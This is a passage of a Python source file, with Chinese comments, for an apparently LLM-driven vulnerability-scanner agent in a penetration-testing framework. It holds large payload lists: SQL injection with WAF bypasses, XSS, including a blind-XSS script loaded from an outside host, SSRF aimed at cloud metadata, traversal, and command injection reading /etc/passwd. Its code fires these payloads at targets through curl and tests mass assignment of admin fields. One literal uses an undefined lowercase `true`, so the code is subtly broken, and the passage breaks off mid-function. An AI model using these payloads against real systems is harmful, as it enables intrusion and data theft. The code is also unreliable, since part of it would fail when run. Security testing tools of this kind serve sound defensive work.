"""扫描 Agent — 自动化漏洞检测（SQLi/XSS/SSRF/IDOR 等）"""
from __future__ import annotations

MANIFEST = {
    "name": "scanner",
    "display_name": "扫描 Agent",
    "description": "18种漏洞检测：SQLi/XSS/SSRF/IDOR/GraphQL/JWT/CORS/SSTI/NoSQL/XXE等",
    "category": "scan",
    "phase": 2,
    "input_requires": [],
    "output_provides": ["scan_results", "scan_findings"],
}

import asyncio
import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse, urljoin

from jianlai.agents.base import BaseAgent
from jianlai.core.shell_executor import run_command, run_commands, check_tool_exists, resolve_tool

logger = logging.getLogger(__name__)


@dataclass
class Finding:
    """漏洞发现"""
    vuln_type: str          # sqli, xss, ssrf, idor, open_redirect, dir_traversal, cmd_injection
    title: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    severity: str = "medium"  # critical, high, medium, low, info
    confidence: str = "medium"  # confirmed, probable, possible
    detail: str = ""
    poc: str = ""


# ---- SQL 注入 payloads ----
SQLI_ERROR_PAYLOADS = [
    "'", "\"",
    "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR '1'='1' --", "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    # WAF 绕过: 空格替换
    "'/**/OR/**/1=1--",
    "'%0aOR%0a1=1--",
    # WAF 绕过: 关键字大小写/双写
    "' UnIoN SeLeCt NULL--",
    "' UNIunionON SELselectECT NULL--",
    # WAF 绕过: 编码
    "%27%20OR%201%3D1--",
    # 堆叠注入
    "'; SELECT SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]

SQLI_ERROR_PATTERNS = re.compile(
    r"(?i)(sql syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|sqlite3\.OperationalError|"
    r"Unclosed quotation mark|unterminated quoted string|Microsoft OLE DB|ODBC SQL Server|"
    r"You have an error in your SQL syntax|Warning.*mysql_|valid MySQL result|"
    r"MySqlClient\.|com\.mysql\.|org\.postgresql\.|SQLite/JDBCDriver|"
    r"SQLSTATE\[|Syntax error.*in query expression|Division by zero|"
    r"supplied argument is not a valid|pg_query\(\)|pg_exec\(\)|"
    r"JET Database Engine|Access Database Engine|ODBC Microsoft Access)",
)

# 多 DBMS 时间盲注
SQLI_TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 5),                                          # MySQL
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),              # MySQL subquery
    ("' OR pg_sleep(5)--", 5),                                       # PostgreSQL
    ("1; WAITFOR DELAY '0:0:5'--", 5),                               # MSSQL
    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),                 # Oracle
    ("';SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", 5),  # SQLite heavy query
]

SQLI_BOOL_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1' --", "1' AND '1'='2' --"),
    # WAF 绕过 bool
    ("'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2"),
    ("1%0aAND%0a1=1", "1%0aAND%0a1=2"),
]

# ---- XSS payloads ----
# 上下文感知 payload（按注入位置分类）
XSS_PAYLOADS = [
    # HTML body 上下文
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    # HTML 属性上下文
    '"><script>alert("XSS")</script>',
    '" onmouseover="alert(1)"',
    "' onfocus='alert(1)' autofocus='",
    # JavaScript 字符串上下文
    "'-alert('XSS')-'",
    '</script><script>alert("XSS")</script>',
    # 模板注入
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    # SVG/Event handler
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
]

# Blind XSS 回调 payload（适用于 Contact/UA/Referer 等存储型字段）
XSS_BLIND_PAYLOADS = [
    '"><script src=https://xss.report/c></script>',
    "'-eval(atob('YWxlcnQoMSk='))-'",
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
]

# ---- SSRF payloads ----
# 多云元数据端点 + IP 编码绕过
SSRF_PAYLOADS = [
    # 基础内网
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    # IPv6
    "http://[::1]",
    "http://[::ffff:127.0.0.1]",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    # IP 编码绕过
    "http://2130706433",         # 十进制 127.0.0.1
    "http://0x7f000001",        # 十六进制
    "http://0177.0.0.1",        # 八进制
    "http://127.1",             # 短写
    "http://127.0.1",           # 短写
    "http://0",                 # Linux 解析为 0.0.0.0
    # 云元数据
    "http://169.254.169.254/latest/meta-data/",     # AWS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance",      # Azure
    "http://100.100.100.200/latest/meta-data/",      # 阿里云
    "http://metadata.tencentyun.com/latest/meta-data/",  # 腾讯云
    # 协议探测
    "file:///etc/passwd",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "dict://127.0.0.1:6379/INFO",        # Redis
    "gopher://127.0.0.1:6379/_INFO",     # Redis via gopher
    "http://127.0.0.1:3306",             # MySQL
    "http://127.0.0.1:5432",             # PostgreSQL
    "http://127.0.0.1:9200",             # Elasticsearch
    "http://127.0.0.1:27017",            # MongoDB
    # DNS Rebinding 绕过
    "http://localtest.me",               # 解析到 127.0.0.1
    "http://spoofed.burpcollaborator.net",
]

# ---- Open Redirect payloads ----
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%00.legitimate.com",
    "javascript:alert(1)",
    "///evil.com",
    "////evil.com",
    "https://evil.com#.legitimate.com",
    "https://evil.com?.legitimate.com",
    "https://legitimate.com@evil.com",
    "/%09/evil.com",
    "/%2f%2fevil.com",
    "/%5c..%5c..%5c..%5cevil.com",
]

# ---- 目录遍历 payloads ----
DIR_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
]

# ---- 命令注入 payloads ----
CMD_INJECTION_PAYLOADS = [
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("`id`", r"uid=\d+"),
    ("$(id)", r"uid=\d+"),
    ("; cat /etc/passwd", r"root:.*:0:0:"),
    ("| cat /etc/passwd", r"root:.*:0:0:"),
    ("; sleep 5", 5),  # time-based
    ("| sleep 5", 5),
]


class ScannerAgent(BaseAgent):
    """扫描 Agent：自动化漏洞检测"""

    name = "scanner"

    def __init__(self, ctx, recon_results: dict[str, Any] | None = None):
        super().__init__(ctx)
        self.recon = recon_results or {}
        self.findings: list[Finding] = []

    async def execute(self) -> dict[str, Any]:
        # 从侦察结果中提取目标
        targets = self._extract_targets()
        if not targets:
            logger.warning("[scanner] 没有可扫描的目标")
            return {"findings": [], "targets_scanned": 0}

        # API 端点枚举
        if targets["urls"]:
            discovered = await self._discover_api_endpoints(targets["urls"])
            targets["api_endpoints"] = list(set(targets["api_endpoints"] + discovered))

        logger.info("[scanner] 目标: %d 个URL, %d 个API端点",
                     len(targets["urls"]), len(targets["api_endpoints"]))

        # LLM 攻击策略规划
        strategy = await self._plan_attack_strategy(targets)
        logger.info("[scanner] 攻击策略: %s", json.dumps(strategy, ensure_ascii=False)[:200])

        # 运行各检测模块
        scan_tasks = []

        # 1. Nuclei 模板扫描
        if strategy.get("use_nuclei", True) and check_tool_exists("nuclei"):
            scan_tasks.append(("nuclei", self._run_nuclei(targets["urls"])))

        # 2. SQL 注入检测
        if strategy.get("test_sqli", True):
            scan_tasks.append(("sqli", self._test_sqli(targets)))

        # 3. XSS 检测
        if strategy.get("test_xss", True):
            scan_tasks.append(("xss", self._test_xss(targets)))

        # 4. SSRF 检测
        if strategy.get("test_ssrf", True):
            scan_tasks.append(("ssrf", self._test_ssrf(targets)))

        # 5. IDOR 检测
        if strategy.get("test_idor", True):
            scan_tasks.append(("idor", self._test_idor(targets)))

        # 6. Open Redirect
        if strategy.get("test_redirect", True):
            scan_tasks.append(("redirect", self._test_open_redirect(targets)))

        # 7. 目录遍历
        if strategy.get("test_dir_traversal", True):
            scan_tasks.append(("dir_traversal", self._test_dir_traversal(targets)))

        # 8. 命令注入
        if strategy.get("test_cmd_injection", True):
            scan_tasks.append(("cmd_injection", self._test_cmd_injection(targets)))

        # 9. GraphQL 注入
        if strategy.get("test_graphql", True):
            scan_tasks.append(("graphql", self._test_graphql(targets)))

        # 10. JWT 攻击 + 认证绕过
        if strategy.get("test_jwt", True):
            scan_tasks.append(("jwt", self._test_jwt(targets)))

        # 11. CORS 配置
        if strategy.get("test_cors", True):
            scan_tasks.append(("cors", self._test_cors(targets)))

        # 12. 安全头审计
        if strategy.get("test_headers", True):
            scan_tasks.append(("headers", self._test_security_headers(targets)))

        # 13. SSTI 模板注入
        if strategy.get("test_ssti", True):
            scan_tasks.append(("ssti", self._test_ssti(targets)))

        # 14. NoSQL 注入
        if strategy.get("test_nosql", True):
            scan_tasks.append(("nosql", self._test_nosql(targets)))

        # 15. XXE 外部实体
        if strategy.get("test_xxe", True):
            scan_tasks.append(("xxe", self._test_xxe(targets)))

        # 16. 文件上传绕过
        if strategy.get("test_upload", True):
            scan_tasks.append(("upload", self._test_upload(targets)))

        # 17. CRLF 注入
        if strategy.get("test_crlf", True):
            scan_tasks.append(("crlf", self._test_crlf(targets)))

        # 18. CSRF 检测
        if strategy.get("test_csrf", True):
            scan_tasks.append(("csrf", self._test_csrf(targets)))

        # 并发执行
        logger.info("[scanner] 启动 %d 个检测模块...", len(scan_tasks))
        results = await asyncio.gather(
            *[task for _, task in scan_tasks],
            return_exceptions=True,
        )

        failed_modules = []
        for (name, _), result in zip(scan_tasks, results):
            if isinstance(result, Exception):
                logger.error("[scanner] 模块 %s 异常: %s", name, result)
                failed_modules.append({"module": name, "error": str(result)})
            elif result:
                logger.info("[scanner] 模块 %s 发现 %d 个问题", name, len(result))

        # 立即写入数据库（防止后续 LLM 分析失败丢失数据）
        for f in self.findings:
            self.ctx.db.insert_finding(
                self.ctx.target_id, f.vuln_type, f.title,
                f.detail, f.severity, f.evidence,
            )

        # LLM 综合分析（失败不丢失已有 findings）
        if self.findings:
            try:
                analysis = await self._analyze_findings()
            except Exception as e:
                logger.error("[scanner] LLM 分析失败: %s", e)
                analysis = {
                    "summary": f"发现 {len(self.findings)} 个漏洞（LLM 分析失败）",
                    "risk_level": "high",
                    "error": str(e),
                }
        else:
            analysis = {"summary": "未发现漏洞", "risk_level": "low"}

        return {
            "findings": [
                {
                    "vuln_type": f.vuln_type,
                    "title": f.title,
                    "url": f.url,
                    "parameter": f.parameter,
                    "payload": f.payload,
                    "severity": f.severity,
                    "confidence": f.confidence,
                    "evidence": f.evidence[:200],
                    "poc": f.poc,
                }
                for f in self.findings
            ],
            "total_findings": len(self.findings),
            "analysis": analysis,
            "targets_scanned": len(targets["urls"]),
            "failed_modules": failed_modules,
        }

    # ---- API 端点枚举 ----

    async def _discover_api_endpoints(self, base_urls: list[str]) -> list[str]:
        """主动探测 API 端点"""
        discovered = []
        common_api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/users", "/api/products",
            "/api/feedbacks", "/api/orders", "/api/auth", "/api/login",
            "/api/search", "/api/config", "/api/admin", "/api/token",
            "/api/comments", "/api/basket", "/api/challenges",
            "/graphql", "/gql", "/v1", "/v2",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/wp-json/wp/v2", "/rest/v1",
        ]

        for base_url in base_urls[:2]:
            base = base_url.rstrip("/")
            cmds = [f"curl -s -o /dev/null -w '%{{http_code}} {base}{p}' -m 3 '{base}{p}'"
                    for p in common_api_paths]

            results = await run_commands(cmds, timeout=5, max_concurrent=10)

            for r in results:
                if r.success and r.stdout.strip():
                    parts = r.stdout.strip().split(" ", 1)
                    if len(parts) == 2:
                        code, url = parts
                        code = code.strip("'\" ")
                        if code in ("200", "201", "204", "301", "302", "401", "403"):
                            path = url.replace(base, "")
                            endpoint = f"{base}{path}"
                            if endpoint not in discovered:
                                discovered.append(endpoint)
                            logger.info("[scanner] 发现 API: %s (%s)", path, code)

        return discovered

    # ---- 目标提取 ----

    def _extract_targets(self) -> dict[str, Any]:
        """从侦察结果中提取可扫描的目标"""
        urls: list[str] = []
        api_endpoints: list[str] = []
        params: list[dict] = []

        # 从 HTTP 探测结果提取 URL
        http_data = self.recon.get("stages", {}).get("http_probe", {})
        for t in http_data.get("targets", []):
            url = t.get("url", "")
            if url:
                urls.append(url)

        # 从 JS 分析提取 API 端点
        js_data = self.recon.get("stages", {}).get("js_analysis", [])
        for item in js_data:
            if item.get("type") in ("api_endpoint", "graphql"):
                endpoint = item.get("value", "")
                if endpoint:
                    # 转为完整 URL
                    if endpoint.startswith("/"):
                        base = urls[0].rstrip("/") if urls else ""
                        endpoint = f"{base}{endpoint}"
                    if endpoint.startswith("http"):
                        api_endpoints.append(endpoint)

        # 从端口扫描构造 URL
        port_data = self.recon.get("stages", {}).get("port_scan", {})
        for p in port_data.get("open_ports", []):
            port = p.get("port", 0)
            host = p.get("host", "localhost")
            if port in (80, 443, 8080, 8443, 3000, 5000, 8000):
                scheme = "https" if port in (443, 8443) else "http"
                url = f"{scheme}://{host}:{port}"
                if url not in urls:
                    urls.append(url)

        return {
            "urls": list(set(urls)),
            "api_endpoints": list(set(api_endpoints)),
            "params": params,
        }

    # ---- 攻击策略规划 ----

    async def _plan_attack_strategy(self, targets: dict) -> dict[str, bool]:
        """使用 LLM 规划攻击策略"""
        recon_summary = {
            "urls": targets["urls"][:5],
            "api_endpoints": targets["api_endpoints"][:10],
            "tech_stack": self.recon.get("analysis", {}).get("tech_stack", []),
            "attack_surface": self.recon.get("analysis", {}).get("attack_surface", []),
        }

        prompt = (
            "基于以下侦察数据，规划漏洞扫描策略。返回 JSON 格式，"
            "每个检测模块设为 true/false 表示是否执行：\n\n"
            f"{json.dumps(recon_summary, ensure_ascii=False, indent=2)}\n\n"
            "返回格式:\n"
            '{"use_nuclei": true, "test_sqli": true, "test_xss": true, '
            '"test_ssrf": false, "test_idor": true, "test_redirect": true, '
            '"test_dir_traversal": true, "test_cmd_injection": false, '
            '"test_graphql": true, "test_jwt": true, "test_cors": true, "test_headers": true, '
            '"test_ssti": true, "test_nosql": true, "test_xxe": true, '
            '"test_upload": true, "test_crlf": true, "test_csrf": true}'
        )

        try:
            result = await self.ctx.llm.chat_json_pro(
                prompt,
                system_prompt=(
                    "你是一个安全测试策略规划专家。根据侦察结果判断哪些漏洞类型值得测试。"
                    "对于已知靶场应用（如OWASP Juice Shop），所有类型都值得测试。"
                    "只返回JSON，不要其他文字。"
                ),
            )
            return result
        except Exception:
            # 默认全测
            return {
                "use_nuclei": True, "test_sqli": True, "test_xss": True,
                "test_ssrf": True, "test_idor": True, "test_redirect": True,
                "test_dir_traversal": True, "test_cmd_injection": True,
                "test_graphql": True, "test_jwt": True, "test_cors": True,
                "test_headers": True, "test_ssti": True, "test_nosql": True,
                "test_xxe": True, "test_upload": True, "test_crlf": True,
                "test_csrf": True,
            }

    # ---- Nuclei 模板扫描 ----

    async def _run_nuclei(self, urls: list[str]) -> list[Finding]:
        """运行 Nuclei 模板扫描"""
        findings = []
        nuclei_bin = resolve_tool("nuclei")

        for url in urls[:3]:
            logger.info("[scanner] Nuclei 扫描: %s", url)
            result = await run_command(
                [
                    nuclei_bin,
                    "-u", url,
                    "-silent",
                    "-severity", "medium,high,critical",
                    "-json",
                    "-timeout", "10",
                ],
                timeout=180,
            )
            if result.success:
                for line in result.lines:
                    try:
                        data = json.loads(line)
                        f = Finding(
                            vuln_type=data.get("type", "nuclei"),
                            title=data.get("info", {}).get("name", "Nuclei Finding"),
                            url=data.get("matched-at", url),
                            severity=data.get("info", {}).get("severity", "medium"),
                            evidence=data.get("extracted-results", ""),
                            detail=data.get("info", {}).get("description", ""),
                            confidence="probable",
                        )
                        findings.append(f)
                        self.findings.append(f)
                    except json.JSONDecodeError:
                        continue

        return findings

    # ---- SQL 注入检测 ----

    async def _test_sqli(self, targets: dict) -> list[Finding]:
        """SQL 注入检测"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        for url in urls[:5]:
            # 提取 URL 参数
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if params:
                # 测试 URL 参数
                for param_name in params:
                    result = await self._sqli_test_param(url, param_name)
                    findings.extend(result)

            # 测试 URL 路径中的 ID 参数
            id_params = re.findall(r'/(\d+)(?:/|$)', parsed.path)
            if id_params:
                result = await self._sqli_test_path(url)
                findings.extend(result)

        self.findings.extend(findings)
        return findings

    async def _sqli_test_param(self, url: str, param: str) -> list[Finding]:
        """测试单个参数的 SQL 注入"""
        findings = []
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        # 1. Error-based 检测
        for payload in SQLI_ERROR_PAYLOADS:
            test_params = {k: v[0] for k, v in base_params.items()}
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
            if r.success and SQLI_ERROR_PATTERNS.search(r.stdout):
                f = Finding(
                    vuln_type="sqli",
                    title=f"SQL注入 (Error-based): 参数 {param}",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=SQLI_ERROR_PATTERNS.search(r.stdout).group()[:100],
                    severity="critical",
                    confidence="confirmed",
                )
                findings.append(f)
                logger.warning("[scanner] SQLi 发现! %s param=%s", url, param)
                return findings  # 找到就停

        # 2. Boolean-based 检测
        for true_payload, false_payload in SQLI_BOOL_PAYLOADS:
            true_params = {k: v[0] for k, v in base_params.items()}
            true_params[param] = true_payload
            true_url = urlunparse(parsed._replace(query=urlencode(true_params)))

            false_params = {k: v[0] for k, v in base_params.items()}
            false_params[param] = false_payload
            false_url = urlunparse(parsed._replace(query=urlencode(false_params)))

            r_true = await run_command(f"curl -sL -m 10 '{true_url}'", timeout=15)
            r_false = await run_command(f"curl -sL -m 10 '{false_url}'", timeout=15)

            if r_true.success and r_false.success:
                len_diff = abs(len(r_true.stdout) - len(r_false.stdout))
                # 长度差异显著说明可能存在注入
                if len_diff > 100 and len(r_true.stdout) > 0 and len(r_false.stdout) > 0:
                    f = Finding(
                        vuln_type="sqli",
                        title=f"SQL注入 (Boolean-based): 参数 {param}",
                        url=url,
                        parameter=param,
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=f"响应长度差异: {len_diff} bytes",
                        severity="critical",
                        confidence="probable",
                    )
                    findings.append(f)
                    return findings

        # 3. Time-based 检测
        for payload, delay in SQLI_TIME_PAYLOADS:
            test_params = {k: v[0] for k, v in base_params.items()}
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            r = await run_command(f"curl -sL -m {delay + 5} '{test_url}'", timeout=delay + 10)
            if r.success and not r.timed_out:
                # 检查实际耗时（从 stderr 提取 curl time）
                time_check = await run_command(
                    f"curl -sL -o /dev/null -w '%{{time_total}}' -m {delay + 5} '{test_url}'",
                    timeout=delay + 10,
                )
                if time_check.success:
                    try:
                        elapsed = float(time_check.stdout.strip())
                        if elapsed >= delay - 1:  # 允许1秒误差
                            f = Finding(
                                vuln_type="sqli",
                                title=f"SQL注入 (Time-based): 参数 {param}",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=f"响应延迟 {elapsed:.1f}s (预期 {delay}s)",
                                severity="critical",
                                confidence="probable",
                            )
                            findings.append(f)
                            return findings
                    except ValueError:
                        pass

        return findings

    async def _sqli_test_path(self, url: str) -> list[Finding]:
        """测试路径中的 ID 参数"""
        findings = []
        parsed = urlparse(url)
        path = parsed.path

        # 替换路径中的数字 ID 为 SQL payload
        test_paths = [
            (re.sub(r'/(\d+)', "/1 OR 1=1", path, count=1), "' OR 1=1"),
            (re.sub(r'/(\d+)', "/1' OR '1'='1", path, count=1), "' OR '1'='1"),
        ]

        baseline_r = await run_command(f"curl -sL -m 10 '{url}'", timeout=15)
        if not baseline_r.success:
            return findings

        for test_path, payload in test_paths:
            test_url = urlunparse(parsed._replace(path=test_path))
            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
            if not r.success:
                continue

            # Error-based
            if SQLI_ERROR_PATTERNS.search(r.stdout):
                findings.append(Finding(
                    vuln_type="sqli", title=f"SQL注入 (Path): {path}",
                    url=url, parameter="path", payload=payload,
                    evidence=SQLI_ERROR_PATTERNS.search(r.stdout).group()[:100],
                    severity="critical", confidence="confirmed",
                ))
                return findings

            # Boolean-based: 注入后响应与基线差异
            if len(r.stdout) > 0 and abs(len(r.stdout) - len(baseline_r.stdout)) > 200:
                findings.append(Finding(
                    vuln_type="sqli", title=f"SQL注入 (Path Boolean): {path}",
                    url=url, parameter="path", payload=payload,
                    evidence=f"响应长度差异: {abs(len(r.stdout) - len(baseline_r.stdout))} bytes",
                    severity="critical", confidence="probable",
                ))
                return findings

        return findings

    # ---- XSS 检测 ----

    async def _test_xss(self, targets: dict) -> list[Finding]:
        """Reflected XSS 检测（含上下文感知和 Blind XSS）"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        marker = "cyberXSS42"
        # 上下文感知 payload
        test_payloads = [
            # HTML body 上下文
            f'<script>{marker}</script>',
            f'<img src=x onerror={marker}>',
            f'<details open ontoggle={marker}>',
            # HTML 属性上下文
            f'">{marker}',
            f"' onfocus='{marker}' autofocus='",
            # JavaScript 字符串上下文
            f"'-{marker}-'",
            f'</script><script>{marker}</script>',
        ]

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if not params:
                continue

            for param_name in params:
                for payload in test_payloads:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                    if r.success and marker in r.stdout:
                        # 检查反射是否在危险上下文（未转义）
                        raw_reflection = re.search(
                            rf'<[^>]*{marker}[^>]*>|["\']{marker}|onerror\s*=\s*{marker}',
                            r.stdout,
                        )
                        confidence = "confirmed" if raw_reflection else "probable"

                        f = Finding(
                            vuln_type="xss",
                            title=f"Reflected XSS: 参数 {param_name}",
                            url=url, parameter=param_name,
                            payload=payload,
                            evidence=f"Payload '{marker}' 在响应中被反射" +
                                     ("（未转义，高危）" if raw_reflection else "（可能已转义）"),
                            severity="high", confidence=confidence,
                            poc=test_url,
                        )
                        findings.append(f)
                        self.findings.append(f)
                        logger.warning("[scanner] XSS 发现! %s param=%s", url, param_name)
                        break
                else:
                    continue
                break

        # CSP 绕过检测
        for url in urls[:2]:
            r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
            if r.success:
                csp_match = re.search(r'(?i)^content-security-policy:\s*(.+)', r.stdout, re.MULTILINE)
                if csp_match:
                    csp = csp_match.group(1).strip()
                    # 检查 CSP 是否允许 unsafe-inline / unsafe-eval
                    if "unsafe-inline" in csp or "unsafe-eval" in csp:
                        f = Finding(
                            vuln_type="xss",
                            title="CSP 包含 unsafe-inline/unsafe-eval",
                            url=url, parameter="Content-Security-Policy",
                            evidence=f"CSP: {csp[:100]}",
                            severity="medium", confidence="confirmed",
                        )
                        findings.append(f)
                        self.findings.append(f)

        return findings

    # ---- SSRF 检测 ----

    async def _test_ssrf(self, targets: dict) -> list[Finding]:
        """SSRF 检测"""
        findings = []
        urls = targets["urls"] + targets["api_endpoints"]

        # 识别可能接受 URL 的参数
        url_params = {"url", "uri", "link", "href", "src", "dest", "redirect",
                      "feed", "img", "image", "file", "path", "page", "proxy",
                      "fetch", "load", "redirect_uri", "callback", "return_url"}

        for url in urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in url_params:
                    for ssrf_url in SSRF_PAYLOADS[:3]:
                        test_params = {k: v[0] for k, v in params.items()}
                        test_params[param_name] = ssrf_url
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                        if r.success:
                            # 检查是否包含内部服务响应特征
                            if any(sig in r.stdout for sig in ["root:", "ami-", "instance-id", "127.0.0.1"]):
                                f = Finding(
                                    vuln_type="ssrf",
                                    title=f"SSRF: 参数 {param_name}",
                                    url=url,
                                    parameter=param_name,
                                    payload=ssrf_url,
                                    evidence=r.stdout[:200],
                                    severity="critical",
                                    confidence="probable",
                                )
                                findings.append(f)
                                self.findings.append(f)
                                break

        return findings

    # ---- IDOR 检测 ----

    async def _test_idor(self, targets: dict) -> list[Finding]:
        """IDOR 检测：路径ID枚举 + HTTP方法切换 + 参数类型混淆 + Mass Assignment"""
        findings = []
        endpoints = targets["api_endpoints"]

        for endpoint in endpoints:
            base = endpoint.rstrip("/")
            id_matches = re.findall(r'/(\d+)(?:/|$)', base)

            if id_matches:
                for id_val in id_matches:
                    for test_id in [str(int(id_val) + 1), str(int(id_val) - 1), "1", "2"]:
                        if test_id == id_val:
                            continue
                        test_url = base.replace(f"/{id_val}/", f"/{test_id}/").replace(f"/{id_val}", f"/{test_id}")
                        r1 = await run_command(f"curl -sL -m 10 '{base}'", timeout=15)
                        r2 = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                        if r1.success and r2.success and len(r2.stdout) > 50:
                            if abs(len(r1.stdout) - len(r2.stdout)) < len(r1.stdout) * 0.5:
                                f = Finding(
                                    vuln_type="idor", title=f"潜在 IDOR: {base}",
                                    url=base, parameter=f"id={id_val}",
                                    payload=f"访问 id={test_id}",
                                    evidence=f"两个 ID 都返回有效响应",
                                    severity="high", confidence="possible", poc=test_url,
                                )
                                findings.append(f)
                                self.findings.append(f)

                                # HTTP 方法切换：GET 被拦截时测试其他方法
                                await self._test_http_method_bypass(test_url, findings)
                                break
            else:
                for test_id in ["1", "2", "3"]:
                    test_url = f"{base}/{test_id}"
                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
                    if r.success and len(r.stdout) > 50:
                        if "<!doctype html>" not in r.stdout.lower()[:200]:
                            r1 = await run_command(f"curl -sL -m 10 '{base}/1'", timeout=15)
                            r2 = await run_command(f"curl -sL -m 10 '{base}/2'", timeout=15)
                            if r1.success and r2.success:
                                if len(r1.stdout) > 50 and len(r2.stdout) > 50:
                                    f = Finding(
                                        vuln_type="idor",
                                        title=f"IDOR: {base} 支持 ID 访问",
                                        url=base, parameter="id",
                                        payload=f"GET {base}/1, GET {base}/2",
                                        evidence=f"ID=1 返回 {len(r1.stdout)} bytes, ID=2 返回 {len(r2.stdout)} bytes",
                                        severity="high", confidence="probable",
                                        poc=f"{base}/1",
                                    )
                                    findings.append(f)
                                    self.findings.append(f)
                                    await self._test_http_method_bypass(f"{base}/1", findings)
                                    break

        # Mass Assignment 检测：在 POST/PUT 端点注入隐藏管理字段
        await self._test_mass_assignment(endpoints, findings)

        return findings

    async def _test_http_method_bypass(self, url: str, findings: list[Finding]) -> None:
        """HTTP 方法切换测试：GET 被拦截时尝试 POST/PUT/PATCH/DELETE"""
        methods = ["POST", "PUT", "PATCH", "DELETE"]
        for method in methods:
            r = await run_command(f"curl -sL -m 10 -X {method} '{url}'", timeout=15)
            if r.success and len(r.stdout) > 50:
                if "<!doctype html>" not in r.stdout.lower()[:200]:
                    f = Finding(
                        vuln_type="idor",
                        title=f"HTTP 方法绕过: {method} {url}",
                        url=url, parameter="HTTP method",
                        payload=f"{method} {url}",
                        evidence=f"{method} 方法返回 {len(r.stdout)} bytes 有效响应",
                        severity="high", confidence="possible",
                        poc=f"curl -X {method} {url}",
                    )
                    findings.append(f)
                    self.findings.append(f)
                    return

    async def _test_mass_assignment(self, endpoints: list[str], findings: list[Finding]) -> None:
        """Mass Assignment 检测：注册/更新端点注入隐藏管理字段"""
        # 识别可能的注册/更新端点
        update_endpoints = []
        for ep in endpoints:
            if any(kw in ep.lower() for kw in ["user", "profile", "account", "register", "signup", "setting"]):
                update_endpoints.append(ep)

        mass_fields = [
            {"role": "admin"}, {"isAdmin": True}, {"is_admin": True},
            {"admin": True}, {"verified": true}, {"active": true},
            {"permissions": "all"}, {"access_level": 999},
        ]

        for ep in update_endpoints[:3]:
            for fields in mass_fields[:4]:
                payload = json.dumps(fields)
                r = await run_command(
                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload}' '{ep}'",
                    timeout=15,
                )
                if r.success and r.stdout:
                    resp = r.stdout.lower()
                    # 检查是否接受了隐藏字段（返回中包含注入的值）
                    if any(kw in resp for kw in ["admin", "verified", "true", "success"]):
                        f = Finding(
                            vuln_type="idor",
                            title=f"Mass Assignment: {ep}",
                            url=ep, parameter="hidden fields",
                            payload=payload,
                            evidence=f"端点接受了隐藏管理字段",
                            severity="critical", confidence="probable",
                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload}' {ep}",
                        )
                        findings.append(f)
                        self.findings.append(f)
                        return

    # ---- Open Redirect ----

    async def _test_open_redirect(self, targets: dict) -> list[Finding]:
        """Open Redirect 检测"""
        findings = []
        redirect_params = {"redirect", "url", "next", "return", "return_url", "redirect_uri",
